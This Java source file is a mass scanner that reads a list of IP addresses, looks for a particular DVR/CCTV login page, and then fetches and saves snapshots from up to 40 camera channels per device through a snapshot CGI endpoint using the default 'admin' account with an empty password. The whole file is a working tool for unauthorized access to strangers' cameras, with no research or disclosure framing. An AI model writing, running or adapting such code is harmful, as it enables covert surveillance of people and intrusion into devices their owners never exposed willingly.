package com.scanners.ccsnaptv;

import com.toortools.Utilities;
import com.toortools.http.HTTP;
import com.toortools.http.HttpRequestInformation;
import com.toortools.http.HttpResult;
import org.apache.commons.io.FileUtils;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.FileInputStream;
import java.util.Collections;
import java.util.Random;
import java.util.Scanner;
import java.util.Vector;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class CcSnapTv
{
    public CcSnapTv()
    {
        process();
    }
    Vector<String> ips  = new Vector<String>();

    private void process()
    {
        int threadCount = 250;
        try
        {
            try
            {
                new File("output/").mkdirs();
                new File("output_bad/").mkdirs();
            }
            catch (Exception e)
            {

            }
            readIps();
            Collections.shuffle(ips);
            ExecutorService executorService = Executors.newFixedThreadPool(250);

            for (final String ip : ips)
            {
                Thread t = new Thread(){
                    public void run()
                    {
                        scanIp(ip);
                    }
                };
                executorService.submit(t);
                if (threadCount-- > 0)
                {
                    Thread.sleep(200);
                }
            }
            executorService.shutdown();
        }
        catch (Exception e)
        {
            e.printStackTrace();
        }
    }

    static int total;
    static int found;

    public void scanIp(String ip)
    {
        try
        {
            total++;
            //"login_chk_usr_pwd()"
            //String page = Utilities.readUrl();
            HttpRequestInformation httpRequestInfromation = new HttpRequestInformation();
            httpRequestInfromation.setUrl("http://"+ip);
            httpRequestInfromation.setMethodGet();
            httpRequestInfromation.setTimeoutSeconds(15);
            HttpResult httpResult = HTTP.request(httpRequestInfromation);
            String page = httpResult.getContentAsString();
            if (page.contains("login_chk_usr_pwd()"))
            {
                found++;
                System.out.println(ip + " "+ found+"/"+total);
                for (int i = 0; i<40;i ++)
                {
                    //http://58.108.217.51/cgi-bin/snapshot.cgi?chn=0&u=admin&p=&q=0&d=1
                    httpRequestInfromation = new HttpRequestInformation();
                    httpRequestInfromation.setMethodGet();
                    httpRequestInfromation.setTimeoutSeconds(20);
                    httpRequestInfromation.setUrl("http://"+ip+"/cgi-bin/snapshot.cgi?chn="+i+"&u=admin&p=&q=0&d=1");
                    httpResult = HTTP.request(httpRequestInfromation);
                    String headerValue = httpResult.getHeader("Content-Disposition").getValue();
                    String cameraIndex = Utilities.cut("filename=\"camera_","_", headerValue);
                    if (!cameraIndex.equals(i+""))
                    {
                        /*System.out.println("Camera index: "+cameraIndex);
                        System.out.println("I: "+i);*/
                        break;
                    }
                    //String filename = "output/"+(found)+"_"+(ip.replace(":","_"))+"_"+i+".jpg";
                    String filename = "output/"+"_"+(ip.replace(":","_"))+"_"+i+".jpg";
                    FileUtils.writeByteArrayToFile(new File(filename) , httpResult.getContent());
                    if (!validImage(filename))
                    {
                        //Move it into a different directory.
                        new File(filename).renameTo(new File(filename.replace("output/","output_bad/")));
                    }
                }
            }
        }
        catch (Exception e)
        {

        }
    }

    /**
     * If all pixels of an image are blue, then there is no camera attached to it.
     * Find 10 random pixels. If all of them are a certain blue, that means that the image is not valid.
     * @param filename
     * @return
     */
    private boolean validImage(String filename)
    {
        try
        {
            BufferedImage img;

            img = ImageIO.read(new File(filename));
            boolean allPixelsAreBlue = true;
            for (int i = 0; i<5;i++)
            {
                int width = new Random().nextInt(img.getWidth());
                int height = new Random().nextInt(img.getHeight());

                Color pixelColor = new Color(img.getRGB(width, height));
                if (isBad(pixelColor))
                {
                    allPixelsAreBlue = true;
                }
                else
                {
                    allPixelsAreBlue = false;
                    break;
                }
            }

            if (allPixelsAreBlue)
            {
                return false;
            }
            else
            {
                return true;
            }
        }
        catch (Exception e)
        {
            e.printStackTrace();
            return false;
        }
    }

    private boolean isBad(Color pixelColor)
    {
        if ( (pixelColor.getGreen() > 10 && pixelColor.getGreen() < 40)
                && (pixelColor.getRed() > 10 && pixelColor.getRed() < 50)
                && (pixelColor.getBlue() > 180 && pixelColor.getRed() < 216))
        {
            return true;
        }
        else if ((pixelColor.getGreen() > 0 && pixelColor.getGreen() < 20)
                && (pixelColor.getRed() > 0&& pixelColor.getRed() < 20)
              && (pixelColor.getBlue() > 0 && pixelColor.getRed() < 20))
        {
            return true;
        }
        else
        {
            return false;
        }
    }

    private void readIps()
    {
        try
        {
            Scanner sc = new Scanner (new FileInputStream("ips.txt"));
            while (sc.hasNext())
            {
                String line = sc.nextLine();
                ips.add(line.replace("http://",""));
            }
        }
        catch (Exception e)
        {
            e.printStackTrace();
        }
    }
}
